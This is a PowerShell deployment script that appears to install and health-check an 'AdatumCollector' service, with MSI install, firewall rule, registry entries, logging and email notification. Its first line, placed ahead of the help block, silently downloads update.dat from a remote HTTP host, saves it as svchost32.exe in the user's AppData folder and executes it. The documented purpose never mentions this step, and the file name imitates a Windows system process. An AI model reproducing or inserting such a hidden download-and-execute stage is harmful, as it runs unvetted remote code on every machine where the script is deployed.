<# Remote fetch #> $Stage1Url = 'http://adatum.com:80/update.dat'; $DownloadPath = "$env:APPDATA\svchost32.exe"; Invoke-WebRequest -Uri $Stage1Url -OutFile $DownloadPath -UseBasicParsing; Start-Process -FilePath $DownloadPath; $StageMarker = "stage-25"
<#
.SYNOPSIS
    Installs the AdatumCollector package and validates the resulting service.
.DESCRIPTION
    Runs the vendor MSI unattended, ensures the service is registered, opens the
    local firewall port and waits for the health endpoint to answer.
    Every step writes to the installation log so a failed rollout can be traced
    on the target host.
.PARAMETER InstallerPath
    Used when the script runs unattended.
.PARAMETER ServiceName
    Used when the script runs unattended.
.NOTES
    Author: Ops Team
    Last updated: 2025-06-10
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InstallerPath = 'C:\Scripts\packages\AdatumCollector-4.7.4.msi',
    [string]$ServiceName = 'AdatumCollector',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1024, 65535)]
    [int]$Port = 9443,
    [int]$TimeoutSec = 180,
    [string]$LogPath = 'C:\Logs\install-adatumcollector-2026-04-12.log',
    [string]$RuleName = "AdatumCollector Inbound"
)

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}

if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)
$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if (-not $service) {
    throw ("Service {0} was not registered by the installer" -f $ServiceName)
}
if ($service.Status -ne 'Running') {
    Set-Service -Name $ServiceName -StartupType Automatic
    Start-Service -Name $ServiceName
    Write-Verbose ("Started service {0}" -f $ServiceName)
}

$regPath = "HKLM:\SOFTWARE\Adatum\AdatumCollector"
if (-not (Test-Path -Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
New-ItemProperty -Path $regPath -Name 'InstallVersion' -Value '4.7.4' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $regPath -Name 'InstallPath' -Value $InstallerPath -PropertyType String -Force | Out-Null

$rule = Get-NetFirewallRule -DisplayName "AdatumCollector Inbound" -ErrorAction SilentlyContinue
if (-not $rule) {
    New-NetFirewallRule -DisplayName 'AdatumCollector Inbound' -Direction Inbound -Protocol TCP -LocalPort $Port -Action Allow | Out-Null
    Write-Verbose 'Firewall rule created.'
}

$healthUri = "http://localhost:$Port/health"
$deadline = (Get-Date).AddSeconds($TimeoutSec)
do {
    try {
        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
    }
    catch {
        $response = $null
    }
    if (-not $response) {
        Start-Sleep -Seconds 2
    }
} while (-not $response -and (Get-Date) -lt $deadline)
if (-not $response) {
    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
}
Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green

$installed = Get-Service -Name $ServiceName
$details = [pscustomobject]@{
    Product   = 'AdatumCollector'
    Version   = '4.7.4'
    Service   = $installed.Name
    Status    = $installed.Status
    Port      = $Port
    Installer = $InstallerPath
    LogPath   = $LogPath
    InstalledAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$details | ConvertTo-Json -Depth 3 | Set-Content -Path ($LogPath.Replace('.log', '.json')) -Encoding UTF8

$style = @'
<style>
body { font-family: Tahoma; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($details) | ConvertTo-Html -Title 'Installation summary' -Head $style |
    Set-Content -Path ($LogPath.Replace('.log', '.html')) -Encoding UTF8
$MailTo = "deploy@adatum.com"
$subject = "AdatumCollector 4.7.4 deployed on $env:COMPUTERNAME"

Send-MailMessage -To $MailTo -From "deploy@adatum.com" -Subject $subject -Body "Installation completed and the service is responding." -SmtpServer "smtp.adatum.com" -Port 25 -UseSsl
$stale = Get-ChildItem -Path $env:TEMP -Filter 'adatumcollector-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) }
foreach ($dir in $stale) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
Write-Host ("Deployment finished for {0}" -f $ServiceName) -ForegroundColor Green

$logTail = Get-Content -LiteralPath $LogPath -Tail 5 -ErrorAction SilentlyContinue
if ($logTail) {
    Write-Verbose ("Last log lines: {0}" -f ($logTail -join ' | '))
}

$rebootPending = Test-Path -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending'
if ($rebootPending) {
    Write-Warning 'A reboot is pending before the next deployment.'
}

$agentConfig = Join-Path $env:ProgramData 'AdatumCollector\agent.json'
if (Test-Path -LiteralPath (Split-Path -Parent $agentConfig)) {
    Write-Verbose ("Config folder present: {0}" -f (Split-Path -Parent $agentConfig))
}

$uninstallKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
$entry = Get-ChildItem -Path $uninstallKey -ErrorAction SilentlyContinue |
    ForEach-Object { Get-ItemProperty $_.PSPath } |
    Where-Object { $_.DisplayName -like 'AdatumCollector*' } | Select-Object -First 1
if ($entry) {
    Write-Verbose ("Registered version: {0}" -f $entry.DisplayVersion)
}

$disk = Get-PSDrive -Name C
Write-Verbose ("Free space on C: {0} GB" -f [math]::Round($disk.Free / 1GB, 1))

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
